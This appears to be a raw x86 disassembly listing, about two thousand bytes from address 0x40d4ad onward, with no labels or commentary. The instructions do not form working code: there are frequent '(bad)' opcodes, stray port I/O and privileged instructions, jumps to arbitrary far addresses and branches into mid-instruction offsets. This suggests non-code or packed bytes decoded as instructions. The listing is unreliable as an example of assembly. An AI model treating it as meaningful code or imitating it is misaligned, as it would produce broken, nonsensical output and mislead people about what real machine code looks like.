  40d4ad:	push   ecx
  40d4ae:	pop    eax
  40d4af:	cmp    al,0x5f
  40d4b1:	in     al,0xb3
  40d4b3:	js     0x40d4bd
  40d4b5:	cmp    eax,0x52a1a8f4
  40d4ba:	pop    ebp
  40d4bb:	ja     0x40d44d
  40d4bd:	shl    DWORD PTR [edx],0xa4
  40d4c0:	les    edx,FWORD PTR [ebp-0x1]
  40d4c3:	and    al,0xf8
  40d4c5:	lock mov BYTE PTR [ecx],cl
  40d4c8:	push   DWORD PTR [esi]
  40d4ca:	sub    dh,bh
  40d4cc:	cld    
  40d4cd:	cli    
  40d4ce:	jmp    0x40d4ac
  40d4d0:	loop   0x40d465
  40d4d2:	scas   al,BYTE PTR es:[edi]
  40d4d3:	add    esp,DWORD PTR [ebx]
  40d4d5:	and    dl,al
  40d4d7:	jecxz  0x40d538
  40d4d9:	inc    esp
  40d4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4db:	jecxz  0x40d54b
  40d4dd:	out    0x4,eax
  40d4df:	frstor ds:0xf927eb5d
  40d4e5:	dec    esp
  40d4e6:	pop    ds
  40d4e7:	jne    0x40d513
  40d4e9:	xchg   DWORD PTR [edx-0x7a],ebx
  40d4ec:	dec    esp
  40d4ed:	and    BYTE PTR [edx],0xfb
  40d4f0:	or     dl,BYTE PTR [edx+0x76]
  40d4f3:	or     al,0x3a
  40d4f5:	xchg   ebx,eax
  40d4f6:	jnp    0x40d547
  40d4f8:	retf   0xd014
  40d4fb:	push   cs
  40d4fc:	mov    ds:0x26f98e5a,eax
  40d501:	xchg   esi,eax
  40d502:	and    eax,0x4bc4e8c1
  40d507:	adc    DWORD PTR [edx+0x451d1823],0x7e
  40d50e:	out    0xa4,al
  40d510:	sahf   
  40d511:	mov    ah,al
  40d513:	mov    eax,ds:0x1a8db981
  40d518:	xchg   DWORD PTR [edi-0x616d2ed],eax
  40d51e:	int3   
  40d51f:	jecxz  0x40d4af
  40d521:	adc    eax,0xc4e708fd
  40d526:	pusha  
  40d527:	(bad)  [ebx]
  40d529:	add    al,0x0
  40d52b:	maxps  xmm2,XMMWORD PTR [eax+0x4569ed5b]
  40d532:	push   cs
  40d533:	loop   0x40d56c
  40d535:	fwait
  40d536:	std    
  40d537:	call   0x951fc1a2
  40d53c:	or     eax,0xa277c61d
  40d541:	popf   
  40d542:	sbb    eax,edx
  40d544:	sub    al,0x2f
  40d546:	cmp    al,0x5d
  40d548:	addr16 mov ecx,0x7701c740
  40d54e:	push   ebp
  40d54f:	ds data16 jle 0x40d529
  40d553:	mov    ch,0xc5
  40d555:	in     eax,dx
  40d556:	in     eax,0x86
  40d558:	call   0xc431:0x1fee0584
  40d55f:	mov    bh,0xde
  40d561:	add    al,0xf8
  40d563:	add    BYTE PTR [edi-0x36],cl
  40d566:	test   eax,0x1db25f57
  40d56b:	jl     0x40d5dc
  40d56d:	ret    0x6a31
  40d570:	and    eax,0x74f22c6b
  40d575:	test   DWORD PTR [ecx+0x30f9aeef],esp
  40d57b:	mov    al,0x4
  40d57d:	mov    al,0x14
  40d57f:	and    al,0xd1
  40d581:	push   0x53
  40d583:	sbb    eax,0xe420852f
  40d588:	test   DWORD PTR [esi-0x7d654246],ebp
  40d58e:	mov    dh,0x6f
  40d590:	adc    BYTE PTR [ebp-0x21d12635],bh
  40d596:	xor    BYTE PTR [ebp-0x6737ccce],al
  40d59c:	paddusb mm3,QWORD PTR [ebx-0x49]
  40d5a0:	out    dx,al
  40d5a1:	bound  ebp,QWORD PTR [edx]
  40d5a3:	repz in ax,dx
  40d5a6:	call   0x86820750
  40d5ab:	mov    BYTE PTR [esi-0x693f9c92],dh
  40d5b1:	ss out dx,eax
  40d5b3:	scas   al,BYTE PTR es:[edi]
  40d5b4:	inc    eax
  40d5b5:	cmp    BYTE PTR [eax-0x7531c0de],ch
  40d5bb:	popf   
  40d5bc:	inc    ebp
  40d5bd:	mov    ch,0x8c
  40d5bf:	test   BYTE PTR [ecx+ebp*4+0x2f],0x6
  40d5c4:	in     eax,dx
  40d5c5:	pop    edx
  40d5c6:	xor    BYTE PTR [edx],bh
  40d5c8:	mov    ebp,0xa811853
  40d5cd:	lea    ecx,[edi]
  40d5cf:	int    0x30
  40d5d1:	retf   
  40d5d2:	mov    BYTE PTR [esp+ebx*2+0x5f103a5d],bh
  40d5d9:	sub    ebx,DWORD PTR ds:0xddf33b25
  40d5df:	sub    BYTE PTR [ecx+edi*4+0x71b2dd8a],bh
  40d5e6:	pop    esp
  40d5e7:	sar    ah,1
  40d5e9:	mov    eax,ds:0xc0196a3c
  40d5ee:	pop    eax
  40d5ef:	(bad)  
  40d5f0:	stos   DWORD PTR es:[edi],eax
  40d5f1:	jecxz  0x40d5fd
  40d5f3:	xor    DWORD PTR [ebx],edx
  40d5f5:	arpl   WORD PTR ds:0x474d751c,sp
  40d5fb:	mov    eax,0x3176e576
  40d600:	rol    DWORD PTR [eax+0x13],0x9e
  40d604:	stc    
  40d605:	or     eax,0x7319f925
  40d60a:	in     eax,dx
  40d60b:	and    ecx,ebx
  40d60d:	mov    edi,0x72e3f28a
  40d612:	cmc    
  40d613:	pop    ecx
  40d614:	xchg   edi,eax
  40d615:	adc    dl,BYTE PTR [eax+0x7c]
  40d618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d619:	(bad)  
  40d61a:	adc    DWORD PTR [ecx+eiz*8+0x7e],edx
  40d61e:	mov    ds:0x990eeddb,eax
  40d623:	aam    0x30
  40d625:	adc    DWORD PTR [edx],ebp
  40d627:	les    ecx,FWORD PTR [edx]
  40d629:	loop   0x40d5b9
  40d62b:	fisub  DWORD PTR [ecx-0x6e]
  40d62e:	stc    
  40d62f:	or     DWORD PTR [edi+0x55217435],ebp
  40d635:	fistp  DWORD PTR [eax+ecx*4-0x76]
  40d639:	jmp    0xbcae:0x121d6782
  40d640:	aaa    
  40d641:	add    eax,0x502b5138
  40d646:	jp     0x40d65f
  40d648:	pop    edx
  40d649:	sub    dh,dh
  40d64b:	pushf  
  40d64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d64d:	ja     0x40d6c9
  40d64f:	cmp    edx,DWORD PTR [edx-0x7df6286e]
  40d655:	fdiv   QWORD PTR [eax+0x3a]
  40d658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d659:	out    dx,eax
  40d65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d65b:	adc    eax,edi
  40d65d:	add    DWORD PTR [edx+0xa48d302],ebx
  40d663:	(bad)  
  40d664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d665:	fldenv [eax-0x241b3f25]
  40d66b:	(bad)  
  40d66d:	hlt    
  40d66e:	xchg   ebx,eax
  40d66f:	and    ecx,ebp
  40d671:	mov    ds:0x20628282,eax
  40d676:	pop    ebx
  40d677:	test   BYTE PTR [edx+0x5f],dl
  40d67a:	lock jl 0x40d6c8
  40d67d:	push   0xded04e18
  40d682:	mov    BYTE PTR [edx],al
  40d684:	xchg   edx,eax
  40d685:	cmp    DWORD PTR [esi+0x526490e1],edi
  40d68b:	mov    ss,WORD PTR [edx]
  40d68d:	adc    al,al
  40d68f:	inc    ebx
  40d690:	ffreep st(4)
  40d692:	test   BYTE PTR [esi],dl
  40d694:	(bad)  
  40d695:	lods   al,BYTE PTR ds:[esi]
  40d696:	arpl   WORD PTR [esi+0x7e],si
  40d699:	shl    ch,cl
  40d69b:	mov    eax,ds:0x619c21de
  40d6a0:	or     DWORD PTR [ebx],esp
  40d6a2:	adc    bl,0xf
  40d6a5:	or     al,0xda
  40d6a7:	fcmovnu st,st(7)
  40d6a9:	jb     0x40d651
  40d6ab:	cmp    BYTE PTR [eax+ebx*8-0x48],al
  40d6af:	adc    bl,dh
  40d6b1:	aas    
  40d6b2:	sub    al,0xb6
  40d6b4:	and    al,0x7c
  40d6b6:	xchg   ebp,eax
  40d6b7:	xor    eax,0x9bb5d654
  40d6bc:	ds cmp eax,0xf5191f20
  40d6c3:	outs   dx,BYTE PTR ds:[esi]
  40d6c4:	add    edx,DWORD PTR [edi+eiz*1-0x7fb1376f]
  40d6cb:	fld    DWORD PTR [ecx-0x6cd7bf4c]
  40d6d1:	sub    DWORD PTR [ebx+0x3b],esi
  40d6d4:	fisub  WORD PTR [ebx+eiz*2+0x1334725d]
  40d6db:	and    ecx,DWORD PTR [esi]
  40d6dd:	jmp    0x40d740
  40d6df:	mov    eax,ecx
  40d6e1:	adc    DWORD PTR [esi+0xd3bbcd7],esp
  40d6e7:	or     eax,0x215d76e3
  40d6ec:	retf   
  40d6ed:	ds inc esi
  40d6ef:	push   edx
  40d6f0:	dec    edx
  40d6f1:	jle    0x40d745
  40d6f3:	sbb    al,0x64
  40d6f5:	cdq    
  40d6f6:	dec    eax
  40d6f7:	repz sti 
  40d6f9:	js     0x40d6c1
  40d6fb:	inc    ecx
  40d6fc:	add    al,0x80
  40d6fe:	pop    ebp
  40d6ff:	xor    eax,0xdbdae2b6
  40d704:	mov    eax,0x8ec14cf
  40d709:	aas    
  40d70a:	add    DWORD PTR [ebx+0x6d],ecx
  40d70d:	repnz inc esp
  40d70f:	sub    cl,BYTE PTR [esi-0x29]
  40d712:	jne    0x40d6cc
  40d714:	mov    eax,ds:0x1a074916
  40d719:	mov    al,0x80
  40d71b:	push   cs
  40d71c:	cmc    
  40d71d:	mov    esp,0xe17a58a
  40d722:	xor    al,0xde
  40d724:	adc    ebp,DWORD PTR [ebx-0x20]
  40d727:	and    al,0x7f
  40d729:	fidivr DWORD PTR [ebp-0x40]
  40d72c:	add    bh,BYTE PTR [edx+0x529ca6f]
  40d732:	shl    BYTE PTR [esi+0x11],1
  40d735:	jne    0x40d76f
  40d737:	ins    DWORD PTR es:[edi],dx
  40d738:	and    edi,0x60
  40d73b:	xchg   ebp,eax
  40d73c:	sub    BYTE PTR [ecx+eiz*1+0xd],0x48
  40d741:	cld    
  40d742:	sub    BYTE PTR [ecx+0xf084236],bh
  40d748:	push   ebp
  40d749:	sar    DWORD PTR [ebp+eax*8+0x2c268c7a],1
  40d750:	dec    ebx
  40d751:	inc    esi
  40d752:	test   dl,bh
  40d754:	imul   edi,DWORD PTR [esi-0x1d18fdd0],0xe7524b9a
  40d75e:	fwait
  40d75f:	out    dx,al
  40d760:	outs   dx,BYTE PTR ds:[esi]
  40d761:	div    BYTE PTR [edi+0x634bca3f]
  40d767:	lods   eax,DWORD PTR ds:[esi]
  40d768:	in     eax,0xff
  40d76a:	lahf   
  40d76b:	in     al,dx
  40d76c:	inc    ecx
  40d76d:	repnz sbb al,bh
  40d770:	sub    eax,0x8392ad2c
  40d775:	out    0x29,al
  40d777:	xchg   BYTE PTR [eax],ah
  40d779:	adc    DWORD PTR [eax+0x2e6bc379],ebp
  40d77f:	test   DWORD PTR [esi-0x6b491903],ecx
  40d785:	push   0x4756497b
  40d78a:	mov    dh,0x6c
  40d78c:	xlat   BYTE PTR ds:[ebx]
  40d78d:	in     al,0xc9
  40d78f:	mov    ds:0x25803060,eax
  40d794:	or     DWORD PTR [ecx-0x6f],0x38
  40d798:	cs pop ecx
  40d79a:	into   
  40d79b:	mov    edi,0x7ba0de90
  40d7a0:	sbb    DWORD PTR [edx+0x7a],0xffffffbe
  40d7a4:	xchg   edi,eax
  40d7a5:	daa    
  40d7a6:	or     ah,BYTE PTR [ebx-0x14]
  40d7a9:	lock retf 
  40d7ab:	xchg   esi,eax
  40d7ac:	pop    esp
  40d7ad:	pop    edi
  40d7ae:	add    ah,BYTE PTR [eax]
  40d7b0:	jmp    0xc53b:0xca55a511
  40d7b7:	xchg   edi,eax
  40d7b8:	push   ss
  40d7b9:	inc    esi
  40d7ba:	push   edi
  40d7bb:	fistp  QWORD PTR [edx]
  40d7bd:	push   cs
  40d7be:	ins    DWORD PTR es:[edi],dx
  40d7bf:	xchg   ecx,eax
  40d7c0:	and    eax,esi
  40d7c2:	pop    es
  40d7c3:	jns    0x40d799
  40d7c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c6:	neg    BYTE PTR [edi]
  40d7c8:	jmp    0x40d7db
  40d7ca:	ror    DWORD PTR [ebp+esi*1-0x17],cl
  40d7ce:	adc    ecx,DWORD PTR [ebp+0x1336381c]
  40d7d4:	lock jnp 0x40d7f5
  40d7d7:	scas   eax,DWORD PTR es:[edi]
  40d7d8:	or     al,dh
  40d7da:	add    BYTE PTR [edi],bh
  40d7dc:	ins    BYTE PTR es:[edi],dx
  40d7dd:	adc    cl,BYTE PTR [eax+0x1580c189]
  40d7e3:	or     eax,0xfd93d61b
  40d7e8:	mov    dh,0x9c
  40d7ea:	mov    eax,fs:0xfeb6dc22
  40d7f0:	scas   al,BYTE PTR es:[edi]
  40d7f1:	je     0x40d78b
  40d7f3:	dec    eax
  40d7f4:	push   es
  40d7f5:	in     al,0x76
  40d7f7:	ins    BYTE PTR es:[edi],dx
  40d7f8:	add    BYTE PTR [esi+0x6db32b71],dl
  40d7fe:	xchg   edx,eax
  40d7ff:	push   edi
  40d800:	sub    ebx,DWORD PTR [eax]
  40d802:	xor    DWORD PTR [eax],edi
  40d804:	dec    bx
  40d806:	and    eax,0x8648722
  40d80b:	inc    esp
  40d80c:	mov    WORD PTR [edi+0x2c],?
  40d80f:	xor    DWORD PTR [eax+0x5b],esi
  40d812:	shr    BYTE PTR [esi],1
  40d814:	push   esp
  40d815:	mov    ebp,0x61016699
  40d81a:	cdq    
  40d81b:	adc    DWORD PTR [ecx+0x4e5a7138],esi
  40d821:	test   esi,ebp
  40d823:	push   cs
  40d824:	sub    eax,0x6dfa20a9
  40d829:	add    BYTE PTR [eax+0x337e6dfb],cl
  40d82f:	xor    eax,0x38ad170e
  40d834:	out    0xac,eax
  40d836:	pop    edx
  40d837:	and    ecx,DWORD PTR [ebp-0xc]
  40d83a:	xchg   ebp,eax
  40d83b:	fwait
  40d83c:	out    dx,eax
  40d83d:	cmc    
  40d83e:	mov    DWORD PTR ds:0x5f9f4b51,esp
  40d844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d845:	idiv   eax
  40d847:	push   0x3
  40d849:	fmul   QWORD PTR [ecx+0x6e32baa4]
  40d84f:	sbb    bh,ch
  40d851:	inc    edx
  40d852:	pop    ecx
  40d853:	push   ebp
  40d854:	and    cl,BYTE PTR [ebp+0xa]
  40d857:	jns    0x40d82a
  40d859:	add    dh,al
  40d85b:	push   0x6
  40d85d:	ds mov esp,0xcb4603fd
  40d863:	push   eax
  40d864:	mov    ds:0x47016b3c,eax
  40d869:	aaa    
  40d86a:	dec    eax
  40d86b:	loope  0x40d892
  40d86d:	lods   eax,DWORD PTR ds:[esi]
  40d86e:	lods   eax,DWORD PTR ds:[esi]
  40d86f:	adc    edi,DWORD PTR [edx]
  40d871:	fcmovu st,st(0)
  40d873:	inc    esi
  40d874:	(bad)  
  40d875:	int3   
  40d876:	mov    eax,0xa421b189
  40d87b:	xlat   BYTE PTR ds:[ebx]
  40d87c:	inc    esp
  40d87d:	pop    ds
  40d87e:	stos   DWORD PTR es:[edi],eax
  40d87f:	dec    esi
  40d880:	mov    ch,ah
  40d882:	mov    ecx,0xb58e768d
  40d887:	sub    al,0x9a
  40d889:	sub    eax,0xe518e325
  40d88e:	push   ss
  40d88f:	xor    DWORD PTR [eax+0x1449e262],ebp
  40d895:	xchg   edi,eax
  40d897:	push   eax
  40d898:	mov    ebx,DWORD PTR [edi+0x8]
  40d89b:	lahf   
  40d89c:	xor    DWORD PTR [edi+0x7723e965],esp
  40d8a2:	retf   0x67a9
  40d8a5:	int    0xa1
  40d8a7:	sub    DWORD PTR [ecx],esp
  40d8a9:	xchg   esi,eax
  40d8aa:	dec    eax
  40d8ab:	fs inc edi
  40d8ad:	mov    ebp,0x8449ea13
  40d8b2:	mov    WORD PTR [ebx],?
  40d8b4:	in     al,0xdf
  40d8b6:	cmp    cl,BYTE PTR [ecx-0x1f]
  40d8b9:	jmp    0x40d8b3
  40d8bb:	loopne 0x40d8b8
  40d8bd:	and    al,0x61
  40d8bf:	les    ecx,FWORD PTR [eax]
  40d8c1:	test   eax,0xefd087c8
  40d8c6:	out    dx,al
  40d8c7:	push   eax
  40d8c8:	rcr    BYTE PTR [ebx],cl
  40d8ca:	out    dx,eax
  40d8cb:	mov    al,ds:0x9533fc1d
  40d8d0:	shl    BYTE PTR [eax-0x6831c5e9],1
  40d8d6:	xchg   ebp,eax
  40d8d7:	xchg   bx,ax
  40d8d9:	in     eax,0x56
  40d8db:	push   es
  40d8dc:	mov    al,ds:0x6f7c981
  40d8e1:	js     0x40d952
  40d8e3:	sbb    BYTE PTR [ecx],dh
  40d8e5:	daa    
  40d8e6:	std    
  40d8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8e8:	mov    gs,eax
  40d8ea:	fcom   QWORD PTR [edi+ecx*4+0x6d62a87f]
  40d8f1:	mov    ds:0xa7c46d69,al
  40d8f6:	pop    ss
  40d8f7:	call   FWORD PTR [edx+0x2eebed00]
  40d8fd:	xchg   BYTE PTR [eax-0x2811008],bl
  40d903:	jle    0x40d896
  40d905:	mov    al,0xa1
  40d907:	add    BYTE PTR [ecx-0x21],cl
  40d90a:	repz in eax,dx
  40d90c:	xor    BYTE PTR [edi],ch
  40d90e:	imul   esp,DWORD PTR [esp+eax*8],0xd4117489
  40d915:	int3   
  40d916:	cdq    
  40d917:	mov    edi,0xc1bf8f27
  40d91c:	(bad)  
  40d91d:	jecxz  0x40d93e
  40d91f:	dec    esp
  40d920:	dec    eax
  40d921:	inc    ebx
  40d922:	bound  ebp,QWORD PTR [ebx-0x709b5111]
  40d928:	mov    ebp,0x4da393d2
  40d92d:	fcomp  DWORD PTR [esi-0x894a4da]
  40d933:	add    BYTE PTR [edi+0x670bf484],cl
  40d939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d93a:	shr    DWORD PTR [ebp-0x20db5e48],0x54
  40d941:	fdivp  st(4),st
  40d943:	xchg   BYTE PTR [ecx-0x13],dl
  40d946:	adc    eax,0x4b79067d
  40d94b:	sti    
  40d94c:	xor    eax,0x54a30974
  40d951:	mov    edi,0x30463dac
  40d956:	fisub  WORD PTR [esi-0x2d]
  40d959:	lds    edi,FWORD PTR [esi+ebp*4-0x76cc8263]
  40d960:	arpl   WORD PTR cs:[esi-0x4f230057],cx
  40d967:	xchg   edx,eax
  40d968:	sbb    eax,ecx
  40d96a:	mov    al,ds:0x4528e192
  40d96f:	ins    BYTE PTR es:[edi],dx
  40d970:	iret   
  40d971:	push   cs
  40d972:	into   
  40d973:	stos   DWORD PTR es:[edi],eax
  40d974:	aas    
  40d975:	push   ecx
  40d976:	aam    0xbe
  40d978:	repnz shr BYTE PTR [eax-0x3],0xf7
  40d97d:	ret    
  40d97e:	ret    0x2f0
  40d981:	jno    0x40d972
  40d983:	sbb    BYTE PTR [edx],0x30
  40d986:	xchg   DWORD PTR ds:0xf20c0ebb,ebp
  40d98c:	(bad)  
  40d98d:	packsswb mm1,QWORD PTR [edi+ebp*8+0x228b6b69]
  40d995:	pop    esp
  40d996:	mov    esp,0x886866ee
  40d99b:	xor    BYTE PTR [ecx+0x161e48be],al
  40d9a1:	shl    ch,1
  40d9a3:	fs push ecx
  40d9a5:	mov    ebp,0xb785e51e
  40d9aa:	jns    0x40da2a
  40d9ac:	bound  ebx,QWORD PTR ds:0x58d29b1c
  40d9b2:	popa   
  40d9b3:	hlt    
  40d9b4:	mov    al,0x1a
  40d9b6:	clc    
  40d9b7:	loop   0x40d95f
  40d9b9:	js     0x40d993
  40d9bb:	inc    edx
  40d9bc:	jge    0x40d988
  40d9be:	inc    eax
  40d9bf:	retf   
  40d9c0:	stos   BYTE PTR es:[edi],al
  40d9c1:	push   esp
  40d9c2:	jo     0x40d94c
  40d9c4:	inc    esp
  40d9c5:	add    bh,0x64
  40d9c8:	jge    0x40d9a4
  40d9ca:	aad    0x73
  40d9cc:	jb     0x40d9f1
  40d9ce:	sub    al,al
  40d9d0:	push   ecx
  40d9d1:	xor    eax,0x6336bb3f
  40d9d6:	(bad)  
  40d9d7:	sbb    eax,0x1d3f3ef2
  40d9dc:	push   ebx
  40d9dd:	pop    es
  40d9de:	iret   
  40d9df:	mov    ebp,0xb2b95deb
  40d9e4:	nop
  40d9e5:	xchg   edx,eax
  40d9e6:	mov    dh,ch
  40d9e8:	mov    esi,0xf14b44c9
  40d9ed:	outs   dx,DWORD PTR ds:[esi]
  40d9ee:	mov    DWORD PTR [ecx+0x68],ebx
  40d9f1:	mul    BYTE PTR [edx+0x64]
  40d9f4:	pop    es
  40d9f5:	pop    ecx
  40d9f6:	dec    edx
  40d9f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f8:	pop    ebx
  40d9f9:	call   0x8f3288df
  40d9fe:	push   es
  40d9ff:	pop    esp
  40da00:	xor    bh,BYTE PTR [edi+ebx*1+0x2275a1db]
  40da07:	mov    ah,0xa2
  40da09:	pop    ss
  40da0a:	xor    BYTE PTR [ebx-0x6f5cfae5],bl
  40da10:	pusha  
  40da11:	lods   eax,DWORD PTR ds:[esi]
  40da12:	outs   dx,DWORD PTR ds:[esi]
  40da13:	jmp    0x40da50
  40da15:	jnp    0x40da75
  40da17:	nop
  40da18:	mov    ah,0x50
  40da1a:	rcl    ch,1
  40da1c:	jno    0x40d9ab
  40da1e:	lods   al,BYTE PTR ds:[esi]
  40da1f:	addr16 aad 0x5
  40da22:	jp     0x40d9b3
  40da24:	imul   ebx,DWORD PTR [edx+eiz*8],0x1b
  40da28:	gs xor bl,ch
  40da2b:	sub    DWORD PTR [eax-0x7a],0xfffffff2
  40da2f:	ret    0xe3a2
  40da32:	and    al,0xa8
  40da34:	dec    eax
  40da35:	mov    esp,0xa3bbd2ca
  40da3a:	fnstcw WORD PTR [eax+eiz*1-0x76]
  40da3e:	cmp    ch,BYTE PTR [ebx+eiz*2+0x5b7f7860]
  40da45:	or     BYTE PTR [edi-0x1ef86223],bl
  40da4b:	jo     0x40daac
  40da4d:	pushf  
  40da4e:	mov    ah,0x3b
  40da50:	xchg   edx,eax
  40da51:	loopne 0x40d9db
  40da53:	fstp   st(2)
  40da55:	rdmsr  
  40da57:	imul   esi,DWORD PTR [eax],0x2
  40da5a:	lock mov DWORD PTR [edx-0x51],edi
  40da5e:	(bad)  
  40da5f:	lock fwait
  40da61:	mov    eax,ds:0xaccabb5c
  40da66:	pop    ebp
  40da67:	adc    eax,0x16ebb2f9
  40da6c:	pop    ss
  40da6d:	bound  ebp,QWORD PTR [ebp-0x53]
  40da70:	aam    0x8e
  40da72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da73:	ret    
  40da74:	mov    ds:0x3363e7a3,eax
  40da79:	clc    
  40da7a:	bnd ret 0x2782
  40da7e:	jmp    0x1e5feee0
  40da83:	and    eax,0xcacab93a
  40da88:	fnstenv [eax+0x57]
  40da8b:	mov    ebx,eax
  40da8d:	mov    DWORD PTR [edx],ecx
  40da8f:	push   cs
  40da90:	jmp    0x40db05
  40da92:	daa    
  40da93:	pop    ds
  40da94:	test   DWORD PTR [eax+0x3b],esp
  40da97:	push   ebp
  40da98:	test   al,0x3f
  40da9a:	les    ebp,FWORD PTR [edx+0x2db7193f]
  40daa0:	jmp    0x40da67
  40daa2:	ffreep st(2)
  40daa4:	fmul   DWORD PTR ds:0x262aff59
  40daaa:	in     al,dx
  40daab:	mul    DWORD PTR [ecx+0x62]
  40daae:	mov    dh,0xb3
  40dab0:	sub    edi,ebp
  40dab2:	ja     0x40da9a
  40dab4:	pop    ebx
  40dab5:	xchg   BYTE PTR [ebx-0x19],dh
  40dab8:	dec    ebp
  40dab9:	ins    BYTE PTR es:[edi],dx
  40daba:	rol    DWORD PTR [ebx+0x55cf7719],1
  40dac0:	popf   
  40dac1:	pusha  
  40dac2:	inc    eax
  40dac3:	sub    DWORD PTR [edi],ecx
  40dac5:	ja     0x40da5d
  40dac7:	mov    ebx,0x64b4b74f
  40dacc:	and    al,0x57
  40dace:	adc    eax,0x89f83e60
  40dad3:	xlat   BYTE PTR ds:[ebx]
  40dad4:	mul    BYTE PTR [edx+ebx*1]
  40dad7:	xchg   BYTE PTR ds:0xf2467576,bl
  40dadd:	and    edi,eax
  40dadf:	scas   al,BYTE PTR es:[edi]
  40dae0:	and    ecx,DWORD PTR [edi]
  40dae2:	ret    0x487e
  40dae5:	mov    esp,0xab0f5c74
  40daea:	rol    DWORD PTR [esi+0x7e],1
  40daed:	jmp    0xe806:0x503f42d1
  40daf4:	(bad)  
  40daf5:	mov    ecx,0x3b848ae1
  40dafa:	pop    eax
  40dafb:	jg     0x40db7c
  40dafd:	add    eax,0x62864aa4
  40db02:	sar    BYTE PTR ds:[edx-0x30],0x25
  40db07:	or     al,0x21
  40db09:	mov    bh,0x53
  40db0b:	and    ch,BYTE PTR [edi+0x7e207b09]
  40db11:	aas    
  40db12:	pop    ecx
  40db13:	adc    BYTE PTR ds:0x7125ab2e,ah
  40db19:	sub    eax,0xfe58f9ee
  40db1e:	jae    0x40dab6
  40db20:	push   DWORD PTR [edi+0x34]
  40db23:	sbb    eax,0x65835c53
  40db28:	pop    es
  40db29:	xlat   BYTE PTR ds:[ebx]
  40db2a:	leave  
  40db2b:	loope  0x40db75
  40db2d:	pop    es
  40db2e:	xchg   ebx,eax
  40db2f:	shl    DWORD PTR ds:0xb28a37a0,cl
  40db35:	cwde   
  40db36:	call   0x21ef:0x57e5c992
  40db3d:	lods   eax,DWORD PTR ds:[esi]
  40db3e:	jbe    0x40dbba
  40db40:	daa    
  40db41:	jg     0x40db99
  40db43:	sbb    al,0x1b
  40db45:	std    
  40db46:	mov    eax,0x78d4a0e3
  40db4b:	pop    ecx
  40db4c:	or     dh,BYTE PTR [esi+0x46]
  40db4f:	clc    
  40db50:	sub    dh,cl
  40db52:	addr16 pop esi
  40db54:	xchg   ah,bh
  40db56:	dec    ebp
  40db57:	ins    BYTE PTR es:[edi],dx
  40db58:	aad    0x9d
  40db5a:	inc    eax
  40db5b:	iret   
  40db5c:	fist   WORD PTR [esi]
  40db5e:	pop    esp
  40db5f:	pop    esi
  40db60:	out    dx,eax
  40db61:	in     al,0xcf
  40db63:	sar    BYTE PTR [esi-0x73],1
  40db66:	pop    ss
  40db67:	lahf   
  40db68:	adc    ebp,0x63
  40db6b:	adc    BYTE PTR [ecx+ebp*1-0x71ab6cc5],ah
  40db72:	push   0x7a
  40db74:	jl     0x40db3a
  40db76:	dec    ecx
  40db77:	add    ah,BYTE PTR [edx-0x623eb159]
  40db7d:	push   ecx
  40db7e:	sub    eax,0x34ebe788
  40db83:	sar    DWORD PTR [eax+0x35d36bee],0x1e
  40db8a:	cli    
  40db8b:	mov    bl,0x15
  40db8d:	dec    esi
  40db8e:	pusha  
  40db8f:	gs pop es
  40db91:	jmp    0x3a6a:0x2f30a0bc
  40db98:	lds    edi,FWORD PTR [edi-0x1a]
  40db9b:	sub    al,BYTE PTR [esi-0xf311186]
  40dba1:	push   eax
  40dba2:	leave  
  40dba3:	repnz xchg esp,eax
  40dba5:	dec    edi
  40dba6:	xchg   edx,eax
  40dba7:	ins    DWORD PTR es:[edi],dx
  40dba8:	aas    
  40dba9:	inc    ebx
  40dbaa:	lods   al,BYTE PTR ds:[esi]
  40dbab:	push   cs
  40dbac:	lock push esi
  40dbae:	dec    esi
  40dbaf:	arpl   sp,si
  40dbb1:	test   BYTE PTR ds:[ebx+0x5f],ah
  40dbb5:	xchg   BYTE PTR [edi-0x27],bh
  40dbb8:	sbb    DWORD PTR [ecx-0x6d],0x9db7edbe
  40dbbf:	aad    0xc0
  40dbc1:	fxch   st(4)
  40dbc3:	adc    dl,BYTE PTR [edi-0x649adfa8]
  40dbc9:	leave  
  40dbca:	aam    0xa8
  40dbcc:	bound  edi,QWORD PTR fs:[ebx+ecx*1-0x3c]
  40dbd1:	popf   
  40dbd2:	mov    ebp,0xa4e34050
  40dbd7:	neg    BYTE PTR [ecx]
  40dbd9:	dec    ecx
  40dbda:	push   esp
  40dbdb:	int3   
  40dbdc:	jmp    0xd84b:0xcd249914
  40dbe3:	push   0x2bb7896b
  40dbe8:	dec    esp
  40dbe9:	mov    ebp,0x6966b3d7
  40dbee:	cmp    esi,DWORD PTR [ecx-0x17ac4104]
  40dbf4:	xor    cl,bh
  40dbf6:	ss cmovns edx,edx
  40dbfa:	imul   edx,DWORD PTR [edi],0x7e
  40dbfd:	outs   dx,DWORD PTR ds:[esi]
  40dbfe:	lods   eax,DWORD PTR ds:[esi]
  40dbff:	mov    esp,0x251082b
  40dc04:	mov    dl,0xab
  40dc06:	mov    bl,0x55
  40dc08:	int    0x1
  40dc0a:	mov    bl,0xd0
  40dc0c:	loopne 0x40dba5
  40dc0e:	and    ebp,DWORD PTR [ebx]
  40dc10:	cmc    
  40dc11:	dec    esp
  40dc12:	les    esp,FWORD PTR [ebx]
  40dc14:	(bad)  
  40dc16:	imul   ebx,DWORD PTR [ebp+eiz*8-0x7c],0x8cc1ea21
  40dc1e:	adc    al,0x3
  40dc20:	dec    edi
  40dc21:	mov    edx,0x978c19d6
  40dc26:	sbb    esi,DWORD PTR [ebx]
  40dc28:	dec    BYTE PTR fs:[ecx-0x19686a6c]
  40dc2f:	aam    0xd0
  40dc31:	(bad)  
  40dc32:	cmc    
  40dc33:	adc    esi,edi
  40dc35:	inc    ecx
  40dc36:	enter  0x3ba8,0x2e
  40dc3a:	xor    eax,0x961d4504
  40dc3f:	add    ebp,DWORD PTR [esi]
  40dc41:	in     al,dx
  40dc42:	xlat   BYTE PTR ds:[ebx]
